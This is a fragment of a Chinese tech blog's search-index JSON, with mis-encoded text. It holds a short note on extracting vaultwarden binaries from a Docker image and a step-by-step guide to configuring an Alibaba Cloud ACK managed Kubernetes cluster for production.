tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker pull vaultwarden/server:alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker create --name vw vaultwarden/server:alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker cp vw:/vaultwarden .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker cp vw:/web-vault .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker rm vw\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·ä¼šå¾—åˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ vaultwarden å’Œä¸€ä¸ªç›®å½• web-vault\u003c/p\u003e","title":"Bitwardenï¼ˆvaultwardenï¼‰å¦‚ä½•åœ¨éDockerç¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨"},{"content":"åœ¨ç”Ÿäº§ç¯å¢ƒæ¥åˆ›å»ºé˜¿é‡ŒACKæ‰˜ç®¡k8sé›†ç¾¤çš„è¿‡ç¨‹ï¼š\nå®Œå…¨ç”¨äºç”Ÿäº§ï¼Œä¸æ˜¯æ­å»ºæ¥åšæµ‹è¯•ç”¨çš„ã€‚\næˆå…¬å¸å§”æ‰˜ï¼Œç»™çš„RAMç”¨æˆ·ï¼Œæ‰€ä»¥é˜¿é‡Œäº‘RAMç¬¬ä¸€æ¬¡ç™»å½•åï¼Œå¼ºåˆ¶ä¿®æ”¹å¯†ç \nç„¶åæˆæƒèµ„æºç®¡ç†ï¼Œ æ­£å¼å¼€å§‹å»ºç«‹è¿‡ç¨‹\nä¸€ã€å‡†å¤‡æ¡ä»¶ ä¸¤å°åŠä»¥ä¸ŠecsæœåŠ¡å™¨\né˜¿é‡Œäº‘è´¦æˆ·ä½™é¢100å…ƒä»¥ä¸Šï¼ˆé˜¿é‡Œäº‘è¦æ±‚ï¼‰\né˜¿é‡Œäº‘ossä¸€ä¸ªï¼ˆosså’Œecsåœ¨ä¸€ä¸ªåŒºåŸŸæœ€å¥½ï¼‰\né¦–å…ˆé˜¿é‡Œäº‘åˆ›å»ºk8sé›†ç¾¤è¦æ±‚è‡³å°‘æœ‰ä¸¤å°ecsæœåŠ¡å™¨ï¼Œå¯ä»¥åˆ›å»ºé›†ç¾¤çš„æ—¶å€™å†è´­ä¹°ï¼Œä¸è¦é¢„å…ˆè´­ä¹°ã€‚\näºŒã€ä¸‹é¢å¼€å§‹åˆ›å»ºï¼š é˜¿é‡Œäº‘æœ€å·¦ä¸Šè§’çš„èœå•ï¼ˆæ–°ç‰ˆæœ¬é¦–é¡µï¼‰-\u0026gt;äº§å“ä¸æœåŠ¡-\u0026gt;å®¹å™¨æœåŠ¡kubernetesç‰ˆæœ¬\nç¬¬ä¸€æ¬¡åˆ›å»ºä¼šè®©å¼€å¯ramæˆæƒï¼Œæ­£å¸¸ç‚¹å‡»æˆæƒå°±å¯ä»¥\nç‚¹å‡»åˆ›å»ºé›†ç¾¤\nç‚¹å‡»åå¦‚ä¸‹\nå„ä¸ªé€‰é¡¹çš„è¯¦ç»†è¯´æ˜ï¼š\nç¬¬ä¸€éƒ¨åˆ†ï¼š\né›†ç¾¤ç‰ˆæœ¬ï¼š æœ€ä¸Šé¢å¯ä»¥é€‰æ‹©ACKæ‰˜ç®¡ç‰ˆï¼Œå’Œå…¶ä»–4ä¸ªç‰ˆæœ¬ï¼Œç€é‡è¯´ä¸€ä¸‹ä¸“æœ‰ç‰ˆå’Œæ‰˜ç®¡ç‰ˆçš„åŒºåˆ«\nä¸“æœ‰ç‰ˆæœ¬ï¼šmasterå’Œworkeréƒ½éœ€è¦è‡ªå·±åˆ›å»ºï¼Œå¦‚æœéœ€è¦é«˜å¯ç”¨ï¼Œé‚£ä¹ˆmasteréœ€è¦è‡³å°‘ä¸‰ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ ä¸æƒ³æŠŠmasterå’Œworkeræ”¾åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œå°±è¦å¤šä½¿ç”¨ä¸‰å°æœåŠ¡å™¨ã€‚\nACKæ‰˜ç®¡ç‰ˆï¼šmasterç”±é˜¿é‡Œäº‘ç»™åˆ›å»ºï¼Œè‡ªå·±åªéœ€è¦è´­ä¹°workeræœåŠ¡å™¨ã€‚\né›†ç¾¤åç§°ï¼š k8s-hbb\nåœ°åŸŸï¼š è¯·é€‰æ‹©è‡ªå·±ecså’Œrdsç­‰èµ„æºæ‰€åœ¨åŒºåŸŸï¼Œè¿™é‡Œæ˜¯åä¸œ2ï¼ˆä¸Šæµ·ï¼‰\nKubernetesç‰ˆæœ¬ï¼šé˜¿é‡Œäº‘å·²ç»åšå¥½å……åˆ†çš„æµ‹è¯•äº†ï¼Œæ‰€ä»¥é€‰æ‹©é»˜è®¤çš„å³å¯ã€‚è¿™é‡Œæ˜¯ 1.18.8-aliyun.1\nå®¹å™¨è¿è¡Œæ—¶ï¼š Docker 19.03.5\nç¬¬äºŒéƒ¨åˆ†ï¼š\nä¸“æœ‰ç½‘ç»œ: ä¸“æœ‰ç½‘ç»œé€‰æ‹©å’Œecsï¼ŒrdsåŒä¸€ä¸ªä¸“æœ‰ç½‘ç»œï¼Œè¿™é‡Œæ˜¯vpc-uf6pcr7nvp3dqmx86yyk0ï¼Œç½‘æ®µæ˜¯172.19.0.0/16\nè™šæ‹Ÿäº¤æ¢æœºï¼š åŒä¸€ä¸ªä¸“æœ‰ç½‘ç»œä¸‹é¢çš„äº¤æ¢æœºæ˜¯å¯ä»¥äº’é€šçš„ï¼Œè¿™é‡Œæ–°å»ºä¸€ä¸ªè™šæ‹Ÿäº¤æ¢æœºï¼Œç½‘æ®µæ˜¯172.19.240.0/20\nç½‘ç»œæ’ä»¶ï¼š é€‰Flannelï¼Œé™¤å»é˜¿é‡Œäº‘è‡ªå·±çš„åŒºåˆ«æè¿°ï¼Œè¿˜æœ‰ä¸€ç‚¹ å¦‚æœä½¿ç”¨flannelæ’ä»¶ï¼Œåˆ™workerç«¯å¯¹å¤–ï¼Œè®¿é—®å¤–ç½‘ï¼ˆæ¯”å¦‚çŸ­ä¿¡æ¥å£ç­‰ï¼‰ä½¿ç”¨çš„æ˜¯worderæ‰€åœ¨ecsè‡ªå·±çš„eipæˆ–è€…å¦‚æœä½¿ç”¨çš„æ˜¯snatæ¨¡å¼ï¼Œå°±æ˜¯snatç»‘å®šçš„eipã€‚å¦‚æœä½¿ç”¨çš„terwayæ’ä»¶åˆ™èµ°çš„å°±æ˜¯snatçš„eipã€‚æ³¨æ„ï¼Œåˆ›å»ºé›†ç¾¤æˆåŠŸåï¼Œä¼šä¸ºé›†ç¾¤åˆ›å»ºä¸€ä¸ªå¯¹å¤–æœåŠ¡çš„ingressçš„slbï¼Œworkerå†…éƒ¨çš„å®¹å™¨ç›´æ¥å¯¹å¤–è®¿é—®ï¼Œä½¿ç”¨çš„ä¸æ˜¯è¿™ä¸ªslbçš„ipã€‚slbåªæ˜¯è¿›æ¥çš„é€šé“ã€‚\npodç½‘ç»œ CIDRï¼šä¸ºç»Ÿä¸€èµ·è§ï¼Œ10.240.0.0/20\nservice CIDRï¼šä¸ºç»Ÿä¸€èµ·è§ï¼Œ192.168.240.0/20\næ³¨æ„ä»¥ä¸Š å»ºç«‹å¥½äº†ä¸‰ä¸ªç½‘æ®µï¼Œä¸‰ä¸ªç½‘æ®µä¸­å‡æœ‰240å­—æ®µï¼Œä¾¿äºè®°å¿†\nECS(2å°)ï¼š172.19.240.0/20\nPODç½‘æ®µï¼š10.240.0.0/20\nServiceç½‘æ®µï¼š192.168.240.0/20 â€‹\nèŠ‚ç‚¹IPæ•°é‡ï¼š256ï¼ŒæŒ‡å•ä¸ªèŠ‚ç‚¹å¯è¿è¡Œ Pod æ•°é‡çš„ä¸Šé™ã€‚ ä¸€å®šè¦æ‹‰åˆ°æœ€å¤§é‡256 ï¼Œå¼„åˆ°16çš„è¯ï¼Œä¸€ä¸ªèŠ‚ç‚¹æœ¬èº«è¦è·‘10å¤šä¸ªsystemçš„podï¼Œå°±æ— æ³•è·‘åº”ç”¨podäº†ã€‚\nç¬¬ä¸‰éƒ¨åˆ†:\né…ç½®SNATï¼šå¿…é€‰é…ç½®SNATï¼Œå¯¹å¤–ä¸»åŠ¨è®¿é—®çš„æ—¶å€™IPéœ€è¦ä¸€è‡´ã€‚è§£é‡Šï¼šå¦‚æœecsæ²¡æœ‰è®¿é—®å¤–ç½‘èƒ½åŠ›ï¼Œåˆ™å¿…é¡»ä½¿ç”¨snatï¼Œsnatå°±æ˜¯æŠŠvpcç»‘å®šä¸€ä¸ªeipï¼Œç„¶åç»™å†…éƒ¨çš„ecsä½¿ç”¨natæ–¹å¼ä¸»åŠ¨å¤–å‡ºè®¿é—®ç”¨çš„ï¼Œæ¯”å¦‚ä¸»åŠ¨åé—®ç¬¬ä¸‰æ–¹çš„æ¥å£ç­‰ã€‚å¦‚æœecsè‡ªå·±å·²ç»ç»‘å®šäº†eipæˆ–è€…è‡ªå¸¦ipå¸¦å®½ï¼Œå¯ä»¥ä¸é€‰æ‹©ã€‚\nAPISERVERè®¿é—®ï¼šå¿…é€‰å…¬ç½‘EIPæš´éœ²ï¼Œè¿™ä¸ªç»‘å®šä»¥åipä¸æ”¶è´¹ï¼Œå¯ä»¥ä½¿ç”¨æµé‡åŒ…ï¼Œç®¡ç†masterç”¨çš„ã€‚å¦‚æœè¦ä½¿ç”¨ã€äº‘æ•ˆã€å¿…é€‰ã€‚\né»˜è®¤ä¸é€‰ä¸­ä½¿ç”¨EIPæš´éœ²API Serverã€‚ API Serveræä¾›äº†å„ç±»èµ„æºå¯¹è±¡ï¼ˆPodï¼ŒServiceç­‰ï¼‰çš„å¢åˆ æ”¹æŸ¥åŠwatchç­‰HTTP Restæ¥å£ã€‚ - å¦‚æœé€‰æ‹©å¼€æ”¾ï¼Œä¼šåˆ›å»ºä¸€ä¸ªEIPï¼Œå¹¶æŒ‚è½½åˆ°å†…ç½‘SLBä¸Šã€‚æ­¤æ—¶ï¼ŒMasterèŠ‚ç‚¹çš„6443ç«¯å£ï¼ˆå¯¹åº”API Serverï¼‰æš´éœ²å‡ºæ¥ï¼Œç”¨æˆ·å¯ä»¥åœ¨å¤–ç½‘é€šè¿‡kubeconfigè¿æ¥å¹¶æ“ä½œé›†ç¾¤ã€‚ - å¦‚æœé€‰æ‹©ä¸å¼€æ”¾ï¼Œåˆ™ä¸ä¼šåˆ›å»ºEIPï¼Œæ‚¨åªèƒ½åœ¨VPCå†…éƒ¨ç”¨kubeconfigè¿æ¥å¹¶æ“ä½œé›†ç¾¤ã€‚\nRDSç™½åå•ï¼šè¿™ä¸ªæ³¨æ„é€‰æ‹©ï¼Œç›®å‰é˜¿é‡Œäº‘æ˜¾ç¤ºå‡ºæ¥çš„åªæœ‰æ™®é€šçš„mysql-rdsï¼Œredisçš„å’Œpolardbçš„éƒ½ä¸æ˜¾ç¤º\nå®‰å…¨ç»„ï¼šé€‰æ‹©ä¼ä¸šç±»å‹å°±å¯ä»¥ï¼ŒåæœŸå¯ä»¥ä¿®æ”¹è§„åˆ™ã€‚\nç¬¬å››éƒ¨åˆ†\nKube-proxyæ¨¡å¼ï¼šé€‰IPVSï¼Œæ¯”IPTABLESæ€§èƒ½é«˜\né›†ç¾¤æœ¬åœ°åŸŸåï¼š hbb.localï¼Œ.localç»“å°¾çš„ç»Ÿç»Ÿæ˜¯æœ¬åœ°åŸŸå\nä¸‹ä¸€æ­¥ï¼Œå¢åŠ worker\nå¿…é¡»é€‰æ–°å¢å®ä¾‹ï¼Œä¸è¦é€‰æ‹©ç°æœ‰å®ä¾‹\næ–°å¢å®ä¾‹ï¼šå°±æ˜¯æ–°è´­ä¹°ecsï¼Œè¦æ³¨æ„è‡ªå·±é€‰æ‹©vpcå’Œäº¤æ¢æœº\né€‰æ‹©å·²æœ‰å®ä¾‹ï¼šå¯ä»¥é€‰æ‹©ç°æœ‰çš„æœåŠ¡å™¨ï¼Œæ³¨æ„ï¼šç°æœ‰æœåŠ¡å™¨ä¼šè¢«æ›´æ¢ç¡¬ç›˜ï¼Œç¡¬ç›˜å†…å®¹ä¼šè¢«æ¸…ç©ºã€‚\nä¼ä¸šçº§å®ä¾‹è§„æ ¼æ—\nå®ä¾‹è§„æ ¼æ—åç§°æ ¼å¼ä¸ºecs.\u0026lt;è§„æ ¼æ—\u0026gt;ï¼Œå®ä¾‹è§„æ ¼åç§°ä¸ºecs.\u0026lt;è§„æ ¼æ—\u0026gt;.largeã€‚\necsï¼šäº‘æœåŠ¡å™¨ECSçš„äº§å“ä»£å·ã€‚ \u0026lt;è§„æ ¼æ—\u0026gt;ï¼šç”±å°å†™å­—æ¯åŠ æ•°å­—ç»„æˆã€‚ å°å†™å­—æ¯ä¸ºæŸä¸ªå•è¯çš„ç¼©å†™ï¼Œå¹¶æ ‡å¿—ç€è§„æ ¼æ—çš„æ€§èƒ½é¢†åŸŸã€‚éƒ¨åˆ†å°å†™å­—æ¯çš„å«ä¹‰å¦‚ä¸‹æ‰€ç¤ºã€‚ cï¼šä¸€èˆ¬è¡¨ç¤ºè®¡ç®—å‹ï¼ˆcomputationalï¼‰ gï¼šä¸€èˆ¬è¡¨ç¤ºé€šç”¨å‹ï¼ˆgeneralï¼‰ rï¼šä¸€èˆ¬è¡¨ç¤ºå†…å­˜å‹ï¼ˆramï¼‰ neï¼šä¸€èˆ¬è¡¨ç¤ºç½‘ç»œå¢å¼ºå‹ï¼ˆnetwork enhancedï¼‰ æ•°å­—ä¸€èˆ¬åŒºåˆ«åŒç±»å‹è§„æ ¼æ—é—´çš„å‘å¸ƒæ—¶é—´ã€‚æ›´å¤§çš„æ•°å­—ä»£è¡¨æ–°ä¸€ä»£è§„æ ¼æ—ï¼Œæ‹¥æœ‰æ›´é«˜çš„æ€§ä»·æ¯”ï¼Œä»·æ ¼ä½æ€§èƒ½å¥½ã€‚ largeï¼šnè¶Šå¤§ï¼ŒvCPUæ ¸æ•°è¶Šå¤šã€‚ ä¾‹å¦‚ï¼Œecs.g6.2xlargeè¡¨ç¤ºé€šç”¨å‹g6è§„æ ¼æ—ä¸­çš„ä¸€ä¸ªå®ä¾‹è§„æ ¼ï¼Œæ‹¥æœ‰8ä¸ªvCPUæ ¸ã€‚ç›¸æ¯”äºg5è§„æ ¼æ—ï¼Œg6ä¸ºæ–°ä¸€ä»£é€šç”¨å‹å®ä¾‹è§„æ ¼æ—ã€‚\næŒ‰ä¸Šé¢é€‰ecs.c6.largeï¼Œè´¹ç”¨0.95/æ—¶ï¼Œä¼¼ä¹æ¯”ecs.n1.medium 1.34/æ—¶å¥½ã€‚\nèŠ‚ç‚¹æ•°é‡ï¼šæœ€å°‘æ˜¯2ä¸ªï¼Œæ— æ³•å‡åˆ°0ï¼Œæ²¡åŠæ³•ã€‚\nç³»ç»Ÿç›˜ï¼šé€‰ESSDï¼Œé€Ÿåº¦å¿«ï¼Œ40Gå³å¯ã€‚ä¸è¦å¼€äº‘ç›˜å¤‡ä»½ï¼Œä¼šè¦æ±‚è®¾ç½®snapshotç­–ç•¥ï¼Œè¦æ”¶é’±ã€‚\næ“ä½œç³»ç»Ÿï¼šé€‰CentOS 7.9ï¼Œä¸è¦é€‰aliyunçš„è‡ªå®šä¹‰ç‰ˆæœ¬ã€‚æ›´åŠ æ ‡å‡†åŒ–ï¼Œä¾¿äºå‡çº§ã€‚\nè¿™é‡Œé€‰æ‹©æ“ä½œç³»ç»Ÿçš„æ—¶å€™ï¼Œåªæœ‰ä¸¤ä¸ªç³»ç»Ÿå¯ä»¥é€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯centos7ï¼Œä¸€ä¸ªæ˜¯é˜¿é‡Œäº‘linuxã€‚ä¸ºä»€ä¹ˆæ“ä½œç³»ç»Ÿä¸èƒ½é€‰å¾ˆå¤šç§ï¼Ÿå› ä¸ºé˜¿é‡Œäº‘è¦ä½¿ç”¨Cloud-initè‡ªåŠ¨å®‰è£…dockerçš„å„ç§å·¥å…·åŒ…è¿›ä½œä¸ºworkerè§’è‰²çš„ecsï¼Œæ‰€ä»¥ä»–å¯¹ç³»ç»Ÿçš„è¦æ±‚æ›´é«˜ï¼Œå¦åˆ™å¾ˆå¯èƒ½å‡ºç°å„ç§å„æ ·çš„é—®é¢˜ã€‚è¿™é‡Œæ‰ä¼šæœ‰è¿™ç§é™åˆ¶ã€‚\nå¯†é’¥å¯¹é€‰åˆ™æ–°å»ºä¸€ä¸ªk8s-sshã€‚\nä¸‹ä¸€æ­¥ç»„ä»¶é…ç½®\nå®‰è£…ingressç»„ä»¶ï¼šéœ€è¦å¯¹å¤–æœåŠ¡ï¼Œè¿™ä¸ªå¿…é€‰ï¼Œä¼šç»™åˆ†é…ä¸€ä¸ªslbè´Ÿè½½å‡è¡¡\nå¦‚æœæƒ³K8Sé›†ç¾¤çš„æœåŠ¡ç›´æ¥æä¾›æœåŠ¡ç»™ç”¨æˆ·è®¿é—®ï¼Œå¯ä»¥é€‰æ‹©ã€å…¬ç½‘ã€ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªSLBå¹¶ç”¨EIPæš´éœ²å…¬ç½‘ï¼Œåç«¯æ˜¯k8s-ingresså…¥å£ã€‚\nè´Ÿè½½ç±»å‹ï¼š å…¬ç½‘ï¼Œå¯¹å¤–æœåŠ¡å°±è¦å†™å…¬ç½‘ã€‚\nå­˜å‚¨æ’ä»¶ï¼š å¿…é€‰CSIï¼Œå¯¹ä¹‹ååˆ›å»ºæ•°æ®å·è¯­æ³•æ²¡å½±å“\nç›‘æ§æ’ä»¶ï¼š åŸºç¡€ç‰ˆæ˜¯å…è´¹çš„ï¼Œå¯ä»¥æ”¾å¿ƒä½¿ç”¨\næ—¥å¿—æœåŠ¡ï¼š æ—¥å¿—æœåŠ¡å¯ä»¥åŠ ï¼Œå°¤å…¶æ˜¯ä»¥åå¦‚æœæƒ³é‡‡é›†å†…éƒ¨dokeré‡Œé¢çš„æ—¥å¿—ï¼Œè¿™é‡Œè¿˜æ˜¯æ¨èåŠ ä¸€ä¸‹æœ€å¥½ï¼Œä»–ä¼šè‡ªåŠ¨åˆ›å»ºæ ‡è®°é‡‡é›†ï¼Œåé¢ä½¿ç”¨è¿™ä¸ªæ ‡è®°å¯ä»¥æ–¹ä¾¿çš„è‡ªåŠ¨æ·»åŠ æ—¥å¿—èŠ‚ç‚¹ã€‚\nslbè´¹ç”¨ï¼š 0.66/å°æ—¶,å¸¦å®½è´¹ç”¨0.8/g\nä¸‹ä¸€æ­¥ç¡®è®¤é…ç½®\næ ¸å¯¹ä¸€ä¸‹æ˜¯å¦å’Œè‡ªå·±é€‰æ‹©çš„ä¸€æ ·\næ ¸å¯¹æ— è¯¯åç‚¹å‡»åˆ›å»ºé›†ç¾¤ã€‚æ³¨æ„ï¼šåˆ›å»ºé›†ç¾¤çš„æ—¶å€™ï¼Œä¼šæ£€æµ‹ä¸€äº›æƒé™ï¼Œå¦‚æœæƒé™æœªå¼€é€šï¼Œå¯ä»¥ä»¤å¼€é¡µé¢è¿›è¡Œå¼€é€šæˆæƒï¼Œæ¯”å¦‚esså¼¹æ€§ä¼¸ç¼©ï¼Œå¼€é€šåç‚¹å°æŒ‰é’®åˆ·æ–°çŠ¶æ€ï¼Œ çŠ¶æ€éƒ½okä»¥åï¼Œç‚¹å‡»åˆ›å»ºé›†ç¾¤ã€‚\nç­‰å¾…ååˆ†é’Ÿå·¦å³é›†ç¾¤åˆ›å»ºæˆåŠŸã€‚åˆ°æ­¤åˆ›å»ºé›†ç¾¤å·²ç»å®Œæˆã€‚\nç„¶ååˆ°æ§åˆ¶å°å¯ä»¥æŸ¥çœ‹ï¼Œè¿™æ ·ACKé›†ç¾¤å°±åˆ›å»ºå¥½äº†ã€‚\nåè®°ï¼š\næ¯æ‰ACKçš„æ—¶å€™ï¼Œåˆ‡å¿Œå»åˆ é™¤arms-promçš„helmï¼Œå†åˆ é™¤acké›†ç¾¤ï¼Œå¦åˆ™ä¼šæ¸…ä¸å¹²å‡€ä¸œè¥¿ã€‚\nä¸‹æ¬¡é‡å»ºçš„æ—¶å€™ä¼šè£…ä¸ä¸Šprometheus\n","permalink":"https://rendoumi.com/posts/20211026-ack_build/","summary":"\u003cp\u003eåœ¨ç”Ÿäº§ç¯å¢ƒæ¥åˆ›å»ºé˜¿é‡ŒACKæ‰˜ç®¡k8sé›†ç¾¤çš„è¿‡ç¨‹ï¼š\u003c/p\u003e\n\u003cp\u003eå®Œå…¨ç”¨äºç”Ÿäº§ï¼Œä¸æ˜¯æ­å»ºæ¥åšæµ‹è¯•ç”¨çš„ã€‚\u003c/p\u003e\n\u003cp\u003eæˆå…¬å¸å§”æ‰˜ï¼Œç»™çš„RAMç”¨æˆ·ï¼Œæ‰€ä»¥é˜¿é‡Œäº‘RAMç¬¬ä¸€æ¬¡ç™»å½•åï¼Œå¼ºåˆ¶ä¿®æ”¹å¯†ç \u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026125509729\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026125509729.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åæˆæƒèµ„æºç®¡ç†ï¼Œ   æ­£å¼å¼€å§‹å»ºç«‹è¿‡ç¨‹\u003c/p\u003e\n\u003ch2 id=\"ä¸€å‡†å¤‡æ¡ä»¶\"\u003eä¸€ã€å‡†å¤‡æ¡ä»¶\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eä¸¤å°åŠä»¥ä¸ŠecsæœåŠ¡å™¨\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eé˜¿é‡Œäº‘è´¦æˆ·ä½™é¢100å…ƒä»¥ä¸Šï¼ˆé˜¿é‡Œäº‘è¦æ±‚ï¼‰\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eé˜¿é‡Œäº‘ossä¸€ä¸ªï¼ˆosså’Œecsåœ¨ä¸€ä¸ªåŒºåŸŸæœ€å¥½ï¼‰\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eé¦–å…ˆé˜¿é‡Œäº‘åˆ›å»ºk8sé›†ç¾¤è¦æ±‚è‡³å°‘æœ‰ä¸¤å°ecsæœåŠ¡å™¨ï¼Œå¯ä»¥åˆ›å»ºé›†ç¾¤çš„æ—¶å€™\u003cstrong\u003eå†è´­ä¹°\u003c/strong\u003eï¼Œä¸è¦é¢„å…ˆè´­ä¹°ã€‚\u003c/p\u003e\n\u003ch2 id=\"äºŒä¸‹é¢å¼€å§‹åˆ›å»º\"\u003eäºŒã€ä¸‹é¢å¼€å§‹åˆ›å»ºï¼š\u003c/h2\u003e\n\u003cp\u003eé˜¿é‡Œäº‘æœ€å·¦ä¸Šè§’çš„èœå•ï¼ˆæ–°ç‰ˆæœ¬é¦–é¡µï¼‰-\u0026gt;äº§å“ä¸æœåŠ¡-\u0026gt;å®¹å™¨æœåŠ¡kubernetesç‰ˆæœ¬\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸€æ¬¡åˆ›å»ºä¼šè®©å¼€å¯ramæˆæƒï¼Œæ­£å¸¸ç‚¹å‡»æˆæƒå°±å¯ä»¥\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026125651594.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç‚¹å‡»åˆ›å»ºé›†ç¾¤\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026130410655\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026130410655.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç‚¹å‡»åå¦‚ä¸‹\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026130535880\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026130535880.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå„ä¸ªé€‰é¡¹çš„è¯¦ç»†è¯´æ˜ï¼š\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸€éƒ¨åˆ†ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026130641164\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026130641164.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé›†ç¾¤ç‰ˆæœ¬ï¼š æœ€ä¸Šé¢å¯ä»¥é€‰æ‹©ACKæ‰˜ç®¡ç‰ˆï¼Œå’Œå…¶ä»–4ä¸ªç‰ˆæœ¬ï¼Œç€é‡è¯´ä¸€ä¸‹ä¸“æœ‰ç‰ˆå’Œæ‰˜ç®¡ç‰ˆçš„åŒºåˆ«\u003c/p\u003e\n\u003cp\u003eä¸“æœ‰ç‰ˆæœ¬ï¼šmasterå’Œworkeréƒ½éœ€è¦è‡ªå·±åˆ›å»ºï¼Œå¦‚æœéœ€è¦é«˜å¯ç”¨ï¼Œé‚£ä¹ˆmasteréœ€è¦è‡³å°‘ä¸‰ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ ä¸æƒ³æŠŠmasterå’Œworkeræ”¾åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œå°±è¦å¤šä½¿ç”¨ä¸‰å°æœåŠ¡å™¨ã€‚\u003c/p\u003e\n\u003cp\u003eACKæ‰˜ç®¡ç‰ˆï¼šmasterç”±é˜¿é‡Œäº‘ç»™åˆ›å»ºï¼Œè‡ªå·±åªéœ€è¦è´­ä¹°workeræœåŠ¡å™¨ã€‚\u003c/p\u003e\n\u003cp\u003eé›†ç¾¤åç§°ï¼š k8s-hbb\u003c/p\u003e\n\u003cp\u003eåœ°åŸŸï¼š è¯·é€‰æ‹©è‡ªå·±ecså’Œrdsç­‰èµ„æºæ‰€åœ¨åŒºåŸŸï¼Œè¿™é‡Œæ˜¯åä¸œ2ï¼ˆä¸Šæµ·ï¼‰\u003c/p\u003e\n\u003cp\u003eKubernetesç‰ˆæœ¬ï¼šé˜¿é‡Œäº‘å·²ç»åšå¥½å……åˆ†çš„æµ‹è¯•äº†ï¼Œæ‰€ä»¥é€‰æ‹©é»˜è®¤çš„å³å¯ã€‚è¿™é‡Œæ˜¯ 1.18.8-aliyun.1\u003c/p\u003e\n\u003cp\u003eå®¹å™¨è¿è¡Œæ—¶ï¼š Docker 19.03.5\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026130846435\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026130846435.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç¬¬äºŒéƒ¨åˆ†ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026130933798\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026130933798.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸“æœ‰ç½‘ç»œ: ä¸“æœ‰ç½‘ç»œé€‰æ‹©å’Œecsï¼ŒrdsåŒä¸€ä¸ªä¸“æœ‰ç½‘ç»œï¼Œè¿™é‡Œæ˜¯vpc-uf6pcr7nvp3dqmx86yyk0ï¼Œç½‘æ®µæ˜¯172.19.0.0/16\u003c/p\u003e\n\u003cp\u003eè™šæ‹Ÿäº¤æ¢æœºï¼š åŒä¸€ä¸ªä¸“æœ‰ç½‘ç»œä¸‹é¢çš„äº¤æ¢æœºæ˜¯å¯ä»¥äº’é€šçš„ï¼Œè¿™é‡Œæ–°å»ºä¸€ä¸ªè™šæ‹Ÿäº¤æ¢æœºï¼Œç½‘æ®µæ˜¯172.19.240.0/20\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026131011787\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026131011787.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç½‘ç»œæ’ä»¶ï¼š é€‰Flannelï¼Œé™¤å»é˜¿é‡Œäº‘è‡ªå·±çš„åŒºåˆ«æè¿°ï¼Œè¿˜æœ‰ä¸€ç‚¹  å¦‚æœä½¿ç”¨flannelæ’ä»¶ï¼Œåˆ™workerç«¯å¯¹å¤–ï¼Œè®¿é—®å¤–ç½‘ï¼ˆæ¯”å¦‚çŸ­ä¿¡æ¥å£ç­‰ï¼‰ä½¿ç”¨çš„æ˜¯worderæ‰€åœ¨ecsè‡ªå·±çš„eipæˆ–è€…å¦‚æœä½¿ç”¨çš„æ˜¯snatæ¨¡å¼ï¼Œå°±æ˜¯snatç»‘å®šçš„eipã€‚å¦‚æœä½¿ç”¨çš„terwayæ’ä»¶åˆ™èµ°çš„å°±æ˜¯snatçš„eipã€‚æ³¨æ„ï¼Œåˆ›å»ºé›†ç¾¤æˆåŠŸåï¼Œä¼šä¸ºé›†ç¾¤åˆ›å»ºä¸€ä¸ªå¯¹å¤–æœåŠ¡çš„ingressçš„slbï¼Œworkerå†…éƒ¨çš„å®¹å™¨ç›´æ¥å¯¹å¤–è®¿é—®ï¼Œä½¿ç”¨çš„ä¸æ˜¯è¿™ä¸ªslbçš„ipã€‚slbåªæ˜¯è¿›æ¥çš„é€šé“ã€‚\u003c/p\u003e\n\u003cp\u003epodç½‘ç»œ 